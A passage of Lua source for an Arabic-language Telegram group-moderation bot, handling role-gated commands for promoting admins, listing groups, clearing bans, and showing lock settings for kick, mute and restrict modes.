if text ==('المطورين') and is_devtaha(msg) then   local list = tahadevstorm:smembers(DEVSTOR..'sudo:bot')  local t = '*📬¦ قائمه مطورين البوت 🍃* \nــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n'  for k, v in pairs(list) do local numadd = tahadevstorm:scard(DEVSTOR..'add:num'..v)   if tahadevstorm:hget('users:'..v, 'uname') then   t = t..'*◖'..k.."◗➣* [" ..get_username(v).."] *{فعل} ◖"..numadd.."◗*\n" else   t = t..'*◖'..k.."◗➣* [`" ..(v).."`] *{فعل} ◖"..numadd.."◗*\n" end  end  if #list == 0 then  t = '📬*¦* لا يوجد مطورين في البوت' end  storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then
if text ==('المجموعات') and is_sudo(msg) then  local list = tahadevstorm:smembers(DEVSTOR..'bot:gpsby:id')  local t = '*🎲¦ ايدي المجموعات التي تم تفعيلها*\n\n*ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'  for k,v in pairs(list) do   t = t..'*◖'..k.."◗* `"..v.."`\n*{"..title_name(v)..'}*\n*ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n'   file = io.open("storm_groups", "w") file:write([[ ]]..isnothtml(t)..[[ ]]) file:close() end  t = t..'*📬¦* لمعرفات معلومات مجموعه معينه\n*🔬¦ اكتب (كشف) + ايدي المجموعه*\n*📃¦* مثال `كشف '..msg.chat_id_..'`'  if #list >= 25 then  sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './storm_groups','📛¦ عدد المجموعات اصبح اكثر من 25\n🚸¦ تم ارسال ملف توجد فيه المجموعات',dl_cb, nil) else storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')  end end
if text ==('رفع ادمن') and is_monsh(msg) then function prom_reply(extra, result, success) mods(msg,msg.chat_id_,result.sender_user_id_) end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)   end end
if text and text:match('^رفع ادمن @(.*)') and is_monsh(msg) then local username = text:match('^رفع ادمن @(.*)') function promreply(extra,result,success) if result.id_ then  tahadevstorm:sadd(DEVSTOR..'mods:'..msg.chat_id_,result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـرقيتـه ادمن للـكروب' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '   end storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md') end   saddbyusername(username,promreply) end
if text and text:match('^رفع ادمن (%d+)') and is_monsh(msg) then local user = text:match('رفع ادمن (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..'' tahadevstorm:sadd(DEVSTOR..'mods:'..msg.chat_id_,user)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تـرقيتـه ادمن للـكروب' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')  end getUser(user, bot_kick) end
if text ==('تنزيل ادمن') and is_monsh(msg) then function prom_reply(extra, result, success) demmods(msg,msg.chat_id_,result.sender_user_id_) end if tonumber(msg.reply_to_message_id_) == 0 then else getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)   end end
if text and text:match('^تنزيل ادمن @(.*)') and is_monsh(msg) then local username = text:match('^تنزيل ادمن @(.*)') function promreply(extra,result,success) if result.id_ then  tahadevstorm:srem(DEVSTOR..'mods:'..msg.chat_id_,result.id_)  zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..result.id_..' }*\n*◗📬¦* تـم تـنزيلـه مــن الادمنيــه ' else  ze = ' ◗♻¦ حاول مره اخره لو سمحت '  end  storm_sendMsg(msg.chat_id_, msg.id_, 1, zo, 1, 'md')  end saddbyusername(username,promreply) end
if text and text:match('^تنزيل ادمن (%d+)') and is_monsh(msg) then local user = text:match('تنزيل ادمن (%d+)') function bot_kick(extra, result, success) username = ''..(result.username_ or ' لم يضع معرف ✨')..''  tahadevstorm:srem(DEVSTOR..'mods:'..msg.chat_id_,user) zo = '*◗📛¦* العضــو [ @'..username..' ]\n*◗💠¦ الايــدي { '..user..' }*\n*◗📬¦* تـم تـنزيلـه مــن الادمنيــه ' storm_sendMsg(msg.chat_id_, msg.id_, 1,zo, 1, 'md')   end  getUser(user, bot_kick) end   end end
if text ==('الادمنيه') and is_mod(msg) then local list = tahadevstorm:smembers(DEVSTOR..'mods:'..msg.chat_id_) local t = '*📊¦ قائمه ادمنية المجموعه✨*\n*ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ*\n' for k, v in pairs(list) do if tahadevstorm:hget('users:'..v, 'uname') then t = t..'*◖'..k.."◗➣* [" ..get_username(v).."]\n"  else  t = t..'*◖'..k.."◗➣* `" ..(v).."`\n"  end  end if #list == 0 then t = '*📬¦* لا يوجد ادمنيه في المجموعه' end storm_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') end
if text ==('مسح الادمنيه') and is_monsh(msg) then tahadevstorm:del(DEVSTOR..'mods:'..msg.chat_id_) storm_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦* تم مسح ادمنيه البوت', 1, 'md') end
if text ==('مسح المطرودين') and is_monsh(msg) then local function delbans(extra, result)  if not msg.can_be_deleted_ == true then  storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else  local num = 0 for k,y in pairs(result.members_) do num = num + 1  changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)  print('==>'..get_username(y.user_id_)) end  storm_sendMsg(msg.chat_id_, msg.id_,  1,'تم الغاء الحظر عن *('..num..')* اشخاص \n', 1, 'md') end  end  getChannelMembers(msg.chat_id_, 0, 'Kicked', 200000, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    end
if text ==('مسح المحذوف') and is_monsh(msg) then local function deleteaccounts(extra, result) if not msg.can_be_deleted_ == true then storm_sendMsg(msg.chat_id_, msg.id_, 1, "*🚨¦* تنبيــه انا لست ادمن يرجى ترقيتي ادمن هنا 👮\n", 1, "md") else for k,v in pairs(result.members_) do  local function cleanaccounts(extra, result) if not result.first_name_ then changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked") end end  getUser(v.user_id_, cleanaccounts, nil) end  storm_sendMsg(msg.chat_id_, msg.id_, 0,'💥*¦*  تم مسح الحسابات المحذوفه', 1, 'md') end end  tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1000}, deleteaccounts, nil) end if is_mod(msg) then local function getadd_or_rem(taha)     if taha == 'welcome' then     local hash = tahadevstorm:get(DEVSTOR..'add:welc:'..msg.chat_id_)     if hash == 'add' then     return '` مفعل ✓ `'     else     return '` معطل ✘ `'     end     elseif taha == 'spam' then     local hash = tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"flood")     if hash then      if tahadevstorm:hget("flooding:settings:"..msg.chat_id_, "flood") == "kick" then     return '` بالطرد 🚷 `'     elseif tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"flood") == "ban" then     return '` بالحظر 🚸 `'     elseif tahadevstorm:hget("flooding:settings:"..msg.chat_id_,"flood") == "mute" then     return '` بالكتم 🔇 `'     end      else     return '` معطل ✘ `'     end      end     end    
if text == 'الاعدادات' and is_monsh(msg) then     if tahadevstorm:get(DEVSTOR..'lock:photo'..msg.chat_id_) then    lock_photo = '` مقفل ✓ `' else lock_photo = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:phon'..msg.chat_id_) then    lock_phon = '` مقفل ✓ `' else lock_phon = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:links'..msg.chat_id_) then    lock_links = '` مقفل ✓ `' else lock_links = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lockpin'..msg.chat_id_) then    lock_pin = '` مقفل ✓ `' else lock_pin = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:tagservr'..msg.chat_id_) then    lock_tagservr = '` مقفل ✓ `' else lock_tagservr = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:links'..msg.chat_id_) then    lock_link = '` مقفل ✓ `' else lock_link = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:cmds'..msg.chat_id_) then    lock_cmds = '` مقفل ✓ `' else lock_cmds = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:user'..msg.chat_id_) then    lock_user = '` مقفل ✓ `' else lock_user = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:hash'..msg.chat_id_) then    lock_hash = '` مقفل ✓ `' else lock_hash = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:muse'..msg.chat_id_) then    lock_muse = '` مقفل ✓ `' else lock_muse = '` مفتوح ✘ `'    end     if tahadevstorm:get(DEVSTOR..'lock:text'..msg.chat_id_) then    lock_text = '` مقفل ✓ `' else lock_text = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:ved'..msg.chat_id_) then    lock_ved = '` مقفل ✓ `' else lock_ved = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:gif'..msg.chat_id_) then    lock_gif = '` مقفل ✓ `' else lock_gif = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:ste'..msg.chat_id_) then    lock_ste = '` مقفل ✓ `' else lock_ste = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:geam'..msg.chat_id_) then    lock_geam = '` مقفل ✓ `' else lock_geam = '` مفتوح ✘ `'    end        if tahadevstorm:get(DEVSTOR..'lock:vico'..msg.chat_id_) then    lock_vico = '` مقفل ✓ `' else lock_vico = '` مفتوح ✘ `'    end        if tahadevstorm:get(DEVSTOR..'lock:inlin'..msg.chat_id_) then    lock_inlin = '` مقفل ✓ `' else lock_inlin = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:addm'..msg.chat_id_) then    lock_add = '` مقفل ✓ `' else lock_add = '` مفتوح ✘ `'    end        if tahadevstorm:get(DEVSTOR..'lock:fwd'..msg.chat_id_) then    lock_fwd = '` مقفل ✓ `' else lock_fwd = '` مفتوح ✘ `'    end        if tahadevstorm:get(DEVSTOR..'lock:file'..msg.chat_id_) then    lock_file = '` مقفل ✓ `' else lock_file = '` مفتوح ✘ `'    end        if tahadevstorm:get(DEVSTOR..'lock:self'..msg.chat_id_) then    lock_self = '` مقفل ✓ `' else lock_self = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:bots:kick'..msg.chat_id_) then    lock_bots = '` مقفل ✓ `' else lock_bots = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:mark'..msg.chat_id_) then    lock_mark = '` مقفل ✓ `' else lock_mark = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:edit'..msg.chat_id_) then    lock_edit = '` مقفل ✓ `' else lock_edit = '` مفتوح ✘ `'    end    if tahadevstorm:get(DEVSTOR..'lock:spm'..msg.chat_id_) then    lock_spam = '` مقفل ✓ `' else lock_spam = '` مفتوح ✘ `'    end        local text = ' 🎁 • اعدادات المجموعه • 🎁\n•——•💠•۪۫•৩﴾ • 📯 • ﴿৩•۪۫•💠•——•\n\n'..    '📮 ❯ الروابط 【'..lock_links..    '】\n'..'📮 ❯ البوتات 【'..lock_bots..    '】\n'..'📮 ❯ التاك 【'..lock_hash..    '】\n'..'📮 ❯ المعرفات 【'..lock_user..    '】\n'..'📮 ❯ التوجيه 【'..lock_fwd..    '】\n'..'📮 ❯ الدخول 【'..lock_add..    '】\n'..'📮 ❯ التثبيت 【'..lock_pin..    '】\n'..'📮 ❯ السيلفي 【'..lock_self..    '】\n'..'📮 ❯ الاشعارات 【'..lock_tagservr..    '】\n'..'📮 ❯ الماركدون 【'..lock_mark..    '】\n'..'📮 ❯ التعديل 【'..lock_edit..    '】\n'..'📮 ❯ الكلايش 【'..lock_spam..    '】\n'..'📮 ❯ اللستات 【'..lock_inlin..    '】\n'..'📮 ❯ الصوت 【'..lock_vico..    '】\n'..'📮 ❯ المتحركه 【'..lock_gif..    '】\n'..'📮 ❯ الملفات 【'..lock_file..    '】\n'..'📮 ❯ الدردشه 【'..lock_text..    '】\n'..'📮 ❯ الفيديو 【'..lock_ved..    '】\n'..'📮 ❯ الالعاب 【'..lock_geam..    '】\n'..'📮 ❯ الصور 【'..lock_photo..    '】\n'..'📮 ❯ الاغاني 【'..lock_muse..    '】\n'..'📮 ❯ الملصقات 【'..lock_ste..    '】\n'..'📮 ❯ الجهات 【'..lock_phon..    '】\n'..'📮 ❯ التكرار 【'..getadd_or_rem('spam')..    '】\n'..'📮 ❯ الترحيب 【'..getadd_or_rem('welcome')..    '】\n'..'📮 ❯ عدد التكرار 【'..NUM_MSG_MAX..    '】\n'..'📮 ❯ زمن التكرار 【'..TIME_CHECK..    '】\n\n•——•📮•۪۫•৩﴾ • 📯 • ﴿৩•۪۫•📮•——•\n'    storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')     end    
if text == 'اعدادات الطرد' and is_monsh(msg) then   if tahadevstorm:get(DEVSTOR..'lockkick:photo'..msg.chat_id_) then  lock_photo = '* مقفل ✓ *'   else  lock_photo = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:phon'..msg.chat_id_) then  lock_phon = '* مقفل ✓ *'    else  lock_phon = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:links'..msg.chat_id_) then  lock_links = '* مقفل ✓ *'    else  lock_links = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockpin'..msg.chat_id_) then  lock_pin = '* مقفل ✓ *'    else  lock_pin = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:tagservr'..msg.chat_id_) then  lock_tagservr = '* مقفل ✓ *'    else  lock_tagservr = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:links'..msg.chat_id_) then  lock_link = '* مقفل ✓ *'    else  lock_link = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:cmds'..msg.chat_id_) then  lock_cmds = '* مقفل ✓ *'    else  lock_cmds = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:user'..msg.chat_id_) then  lock_user = '* مقفل ✓ *'    else  lock_user = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:hash'..msg.chat_id_) then  lock_hash = '* مقفل ✓ *'    else  lock_hash = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:muse'..msg.chat_id_) then  lock_muse = '* مقفل ✓ *'    else  lock_muse = '* مفتوح ✘ *'  end   if tahadevstorm:get(DEVSTOR..'lockkick:text'..msg.chat_id_) then  lock_text = '* مقفل ✓ *'    else  lock_text = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:ved'..msg.chat_id_) then  lock_ved = '* مقفل ✓ *'    else  lock_ved = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:gif'..msg.chat_id_) then  lock_gif = '* مقفل ✓ *'    else  lock_gif = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:ste'..msg.chat_id_) then  lock_ste = '* مقفل ✓ *'    else  lock_ste = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:geam'..msg.chat_id_) then  lock_geam = '* مقفل ✓ *'    else  lock_geam = '* مفتوح ✘ *'  end    if tahadevstorm:get(DEVSTOR..'lockkick:vico'..msg.chat_id_) then  lock_vico = '* مقفل ✓ *'    else  lock_vico = '* مفتوح ✘ *'  end    if tahadevstorm:get(DEVSTOR..'lockkick:inlin'..msg.chat_id_) then  lock_inlin = '* مقفل ✓ *'    else  lock_inlin = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:addm'..msg.chat_id_) then  lock_add = '* مقفل ✓ *'    else  lock_add = '* مفتوح ✘ *'  end    if tahadevstorm:get(DEVSTOR..'lockkick:fwd'..msg.chat_id_) then  lock_fwd = '* مقفل ✓ *'    else  lock_fwd = '* مفتوح ✘ *'  end    if tahadevstorm:get(DEVSTOR..'lockkick:file'..msg.chat_id_) then  lock_file = '* مقفل ✓ *'    else  lock_file = '* مفتوح ✘ *'  end    if tahadevstorm:get(DEVSTOR..'lockkick:self'..msg.chat_id_) then  lock_self = '* مقفل ✓ *'    else  lock_self = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_) then  lock_bots = '* مقفل ✓ *'    else  lock_bots = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:mark'..msg.chat_id_) then  lock_mark = '* مقفل ✓ *'    else  lock_mark = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:edit'..msg.chat_id_) then  lock_edit = '* مقفل ✓ *'    else  lock_edit = '* مفتوح ✘ *'  end  if tahadevstorm:get(DEVSTOR..'lockkick:spm'..msg.chat_id_) then  lock_spam = '* مقفل ✓ *'    else  lock_spam = '* مفتوح ✘ *'  end    local text = '*📊¦* اهلا بك في اعدادات الكروب بالطرد ✨'..'\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n'..  '📛*¦* الروابط بالطرد  ◖'..lock_links..  '◗\n'..'📛*¦* البوتات بالطرد  ◖'..lock_bots..  '◗\n'..'📛*¦* التاك بالطرد  ◖'..lock_hash..  '◗\n'..'📛*¦* المعرفات بالطرد  ◖'..lock_user..  '◗\n'..'📛*¦* التوجيه بالطرد  ◖'..lock_fwd..  '◗\n'..'📛*¦* السيلفي بالطرد  ◖'..lock_self..  '◗\n'..'📛*¦* الماركدون بالطرد  ◖'..lock_mark..  '◗\n'..'📛*¦* الكلايش بالطرد  ◖'..lock_spam..  '◗\n'..'📛*¦* اللستات بالطرد  ◖'..lock_inlin..  '◗\n'..'📛*¦* الصوت بالطرد  ◖'..lock_vico..  '◗\n'..'📛*¦* المتحركه بالطرد  ◖'..lock_gif..  '◗\n'..'📛*¦* الملفات بالطرد  ◖'..lock_file..  '◗\n'..'📛*¦* الدردشه بالطرد  ◖'..lock_text..  '◗\n'..'📛*¦* الفيديو بالطرد  ◖'..lock_ved..  '◗\n'..'📛*¦* الالعاب بالطرد  ◖'..lock_geam..  '◗\n'..'📛*¦* الصور بالطرد  ◖'..lock_photo..  '◗\n'..'📛*¦* الاغاني بالطرد  ◖'..lock_muse..  '◗\n'..'📛*¦* الملصقات بالطرد  ◖'..lock_ste..  '◗\n'..'📛*¦* الجهات بالطرد  ◖'..lock_phon..  '◗\n*•——•🔸•۪۫•৩﴾ > 🍂 < ﴿৩•۪۫•🔸•——•*\n'  storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')   end
if text == 'اعدادات الكتم' and is_monsh(msg) then    if tahadevstorm:get(DEVSTOR..'lockktm:photo'..msg.chat_id_) then   lock_photo = '* مقفل ✓ *'    else   lock_photo = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:phon'..msg.chat_id_) then   lock_phon = '* مقفل ✓ *'     else   lock_phon = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:links'..msg.chat_id_) then   lock_links = '* مقفل ✓ *'     else   lock_links = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockpin'..msg.chat_id_) then   lock_pin = '* مقفل ✓ *'     else   lock_pin = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:tagservr'..msg.chat_id_) then   lock_tagservr = '* مقفل ✓ *'     else   lock_tagservr = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:links'..msg.chat_id_) then   lock_link = '* مقفل ✓ *'     else   lock_link = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:cmds'..msg.chat_id_) then   lock_cmds = '* مقفل ✓ *'     else   lock_cmds = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:user'..msg.chat_id_) then   lock_user = '* مقفل ✓ *'     else   lock_user = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:hash'..msg.chat_id_) then   lock_hash = '* مقفل ✓ *'     else   lock_hash = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:muse'..msg.chat_id_) then   lock_muse = '* مقفل ✓ *'     else   lock_muse = '* مفتوح ✘ *'   end    if tahadevstorm:get(DEVSTOR..'lockktm:text'..msg.chat_id_) then   lock_text = '* مقفل ✓ *'     else   lock_text = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:ved'..msg.chat_id_) then   lock_ved = '* مقفل ✓ *'     else   lock_ved = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:gif'..msg.chat_id_) then   lock_gif = '* مقفل ✓ *'     else   lock_gif = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:ste'..msg.chat_id_) then   lock_ste = '* مقفل ✓ *'     else   lock_ste = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:geam'..msg.chat_id_) then   lock_geam = '* مقفل ✓ *'     else   lock_geam = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockktm:vico'..msg.chat_id_) then   lock_vico = '* مقفل ✓ *'     else   lock_vico = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockktm:inlin'..msg.chat_id_) then   lock_inlin = '* مقفل ✓ *'     else   lock_inlin = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:addm'..msg.chat_id_) then   lock_add = '* مقفل ✓ *'     else   lock_add = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockktm:fwd'..msg.chat_id_) then   lock_fwd = '* مقفل ✓ *'     else   lock_fwd = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockktm:file'..msg.chat_id_) then   lock_file = '* مقفل ✓ *'     else   lock_file = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockktm:self'..msg.chat_id_) then   lock_self = '* مقفل ✓ *'     else   lock_self = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:bots:kick'..msg.chat_id_) then   lock_bots = '* مقفل ✓ *'     else   lock_bots = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:mark'..msg.chat_id_) then   lock_mark = '* مقفل ✓ *'     else   lock_mark = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:edit'..msg.chat_id_) then   lock_edit = '* مقفل ✓ *'     else   lock_edit = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockktm:spm'..msg.chat_id_) then   lock_spam = '* مقفل ✓ *'     else   lock_spam = '* مفتوح ✘ *'   end      local text = '*📊¦* اهلا بك في اعدادات الكروب بالكتم ✨'..'\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n'..   '🔕*¦* الروابط بالكتم  ◖'..lock_links..   '◗\n'..'🔕*¦* التاك بالكتم  ◖'..lock_hash..   '◗\n'..'🔕*¦* المعرفات بالكتم  ◖'..lock_user..   '◗\n'..'🔕*¦* التوجيه بالكتم  ◖'..lock_fwd..   '◗\n'..'🔕*¦* السيلفي بالكتم  ◖'..lock_self..   '◗\n'..'🔕*¦* الماركدون بالكتم  ◖'..lock_mark..   '◗\n'..'🔕*¦* الكلايش بالكتم  ◖'..lock_spam..   '◗\n'..'🔕*¦* اللستات بالكتم  ◖'..lock_inlin..   '◗\n'..'🔕*¦* الصوت بالكتم  ◖'..lock_vico..   '◗\n'..'🔕*¦* المتحركه بالكتم  ◖'..lock_gif..   '◗\n'..'🔕*¦* الملفات بالكتم  ◖'..lock_file..   '◗\n'..'🔕*¦* الفيديو بالكتم  ◖'..lock_ved..   '◗\n'..'🔕*¦* الالعاب بالكتم  ◖'..lock_geam..   '◗\n'..'🔕*¦* الصور بالكتم  ◖'..lock_photo..   '◗\n'..'🔕*¦* الاغاني بالكتم  ◖'..lock_muse..   '◗\n'..'🔕*¦* الملصقات بالكتم  ◖'..lock_ste..   '◗\n'..'🔕*¦* الجهات بالكتم  ◖'..lock_phon..   '◗\n*•——•🔸•۪۫•৩﴾ > 🍂 < ﴿৩•۪۫•🔸•——•*\n'   storm_sendMsg(msg.chat_id_, msg.id_, 1, text, 1, 'md')    end
if text == 'اعدادات التقيد' and is_monsh(msg) then    if tahadevstorm:get(DEVSTOR..'lockked:photo'..msg.chat_id_) then   lock_photo = '* مقفل ✓ *'    else   lock_photo = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:phon'..msg.chat_id_) then   lock_phon = '* مقفل ✓ *'     else   lock_phon = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:links'..msg.chat_id_) then   lock_links = '* مقفل ✓ *'     else   lock_links = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockpin'..msg.chat_id_) then   lock_pin = '* مقفل ✓ *'     else   lock_pin = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:tagservr'..msg.chat_id_) then   lock_tagservr = '* مقفل ✓ *'     else   lock_tagservr = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:links'..msg.chat_id_) then   lock_link = '* مقفل ✓ *'     else   lock_link = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:cmds'..msg.chat_id_) then   lock_cmds = '* مقفل ✓ *'     else   lock_cmds = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:user'..msg.chat_id_) then   lock_user = '* مقفل ✓ *'     else   lock_user = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:hash'..msg.chat_id_) then   lock_hash = '* مقفل ✓ *'     else   lock_hash = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:muse'..msg.chat_id_) then   lock_muse = '* مقفل ✓ *'     else   lock_muse = '* مفتوح ✘ *'   end    if tahadevstorm:get(DEVSTOR..'lockked:text'..msg.chat_id_) then   lock_text = '* مقفل ✓ *'     else   lock_text = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:ved'..msg.chat_id_) then   lock_ved = '* مقفل ✓ *'     else   lock_ved = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:gif'..msg.chat_id_) then   lock_gif = '* مقفل ✓ *'     else   lock_gif = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:ste'..msg.chat_id_) then   lock_ste = '* مقفل ✓ *'     else   lock_ste = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:geam'..msg.chat_id_) then   lock_geam = '* مقفل ✓ *'     else   lock_geam = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockked:vico'..msg.chat_id_) then   lock_vico = '* مقفل ✓ *'     else   lock_vico = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockked:inlin'..msg.chat_id_) then   lock_inlin = '* مقفل ✓ *'     else   lock_inlin = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:addm'..msg.chat_id_) then   lock_add = '* مقفل ✓ *'     else   lock_add = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockked:fwd'..msg.chat_id_) then   lock_fwd = '* مقفل ✓ *'     else   lock_fwd = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockked:file'..msg.chat_id_) then   lock_file = '* مقفل ✓ *'     else   lock_file = '* مفتوح ✘ *'   end      if tahadevstorm:get(DEVSTOR..'lockked:self'..msg.chat_id_) then   lock_self = '* مقفل ✓ *'     else   lock_self = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:bots'..msg.chat_id_) then   lock_bots = '* مقفل ✓ *'     else   lock_bots = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:mark'..msg.chat_id_) then   lock_mark = '* مقفل ✓ *'     else   lock_mark = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:edit'..msg.chat_id_) then   lock_edit = '* مقفل ✓ *'     else   lock_edit = '* مفتوح ✘ *'   end   if tahadevstorm:get(DEVSTOR..'lockked:spm'..msg.chat_id_) then   lock_spam = '* مقفل ✓ *'     else   lock_spam = '* مفتوح ✘ *'   end      local text = '*📊¦* اهلا بك في اعدادات الكروب بالتقيد ✨'..'\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n'..   '🚷*¦* الروابط بالتقيد  ◖'..lock_links..   '◗\n'..'🚷*¦* البوتات بالتقيد  ◖'..lock_bots..   '◗\n'..'🚷*¦* التاك بالتقيد  ◖'..lock_hash..   '◗\n'..'🚷*¦* المعرفات بالتقيد  ◖'..lock_user..   '◗\n'..'🚷*¦* التوجيه بالتقيد  ◖'..lock_fwd..   '◗\n'..'🚷*¦* السيلفي بالتقيد  